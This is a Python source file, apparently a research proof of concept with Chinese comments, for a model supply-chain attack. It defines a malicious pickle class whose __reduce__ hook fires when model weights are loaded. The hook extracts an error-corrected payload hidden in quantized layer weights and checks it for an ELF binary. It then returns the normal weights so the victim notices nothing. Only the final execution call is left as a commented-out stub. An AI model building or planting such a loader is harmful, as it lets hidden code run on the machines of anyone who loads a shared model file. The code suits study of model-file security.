import torch
import numpy as np
import binascii
from src.quantizer import BlockQuantizer
from src.attack.protocol import StegoProtocol, TRIGGER_SEQ

# 攻击载荷：恶意序列化类
class StegoModelWrapper:
    def __init__(self, state_dict, target_layer_name, n, q_bits=4):
        self.state_dict = state_dict
        self.target_name = target_layer_name # 层数
        self.n = n                           # 嵌入位数
        self.q = q_bits                      # 量化精度

    def __reduce__(self):
        # 序列化时，保存所有提取需要的参数
        return (self.activate_trigger, (self.state_dict, self.target_name, self.n, self.q))

    @staticmethod
    def activate_trigger(state_dict, target_name, n, q):
        print(f"\n[!!!] LOADER: Model loaded. Searching for payload in '{target_name}'...")
        
        try:
            # 1. 获取藏毒的权重
            target_weight = state_dict[target_name]
            
            # 2. 现场执行提取逻辑 (复刻extract_payload_auto)
            # 利用 BlockQuantizer 和 StegoProtocol 静态方法
            
            # 2.1 模拟量化环境
            q_w, _, _, _ = BlockQuantizer.quantize(target_weight, q)
            
            # 2.2 计算 Scale Locking Mask 
            prot_mask = BlockQuantizer.get_protection_mask(target_weight)
            valid_indices = torch.nonzero(prot_mask).squeeze()
            
            # 2.3 读取原始比特流
            vals = q_w.view(-1)[valid_indices].cpu().numpy().astype(np.int32)
            limit = 200000 
            vals = vals[:limit] & 0xFFFF
            bits_matrix = (vals[:, None] >> np.arange(n)) & 1
            extracted_bits = bits_matrix.flatten().tolist()
            
            # 3. 解析比特流
            bit_str = "".join(map(str, extracted_bits))
            trig_str = "".join(map(str, TRIGGER_SEQ))
            best_idx = bit_str.find(trig_str)
            
            if best_idx != -1:
                print("[!!!] LOADER: Trigger signature verified.")
                
                # 解析头信息
                curr = best_idx + len(TRIGGER_SEQ)
                # n_star = ... (skip 4 bits)
                curr += 4 
                
                # 解析长度
                len_bits = extracted_bits[curr : curr+16]
                payload_len = StegoProtocol.bits_to_int(len_bits)
                curr += 16
                
                # 提取数据体
                total_data_bits = payload_len * 8 * 5 # 5x ECC
                raw_data = extracted_bits[curr : curr + total_data_bits]
                
                # ECC 解码
                decoded_bits = StegoProtocol.decode_repetition_code(raw_data, factor=5)
                payload_bytes = StegoProtocol.bits_to_bytes(decoded_bits)
                
                # 4. 执行二进制代码
                hex_dump = binascii.hexlify(payload_bytes[:8]).decode()
                print(f"[!!!] LOADER: Payload extracted ({payload_len} bytes).")
                print(f"[!!!] LOADER: Header check: {hex_dump}...")
                
                if payload_bytes.startswith(b'\x7fELF'):
                    print(f"\033[91m[!!!] CRITICAL: ELF Binary detected! Executing in memory (memfd_create)...\033[0m")
                    # os.system("...")  真实攻击执行
                else:
                    print("[?] LOADER: Unknown payload type.")
            else:
                print("[-] LOADER: No payload found (Integrity check failed).")
                
        except Exception as e:
            print(f"[-] LOADER Error: {e}")

        # 5. 返回正常的模型权重，让受害者以为一切正常
        return state_dict
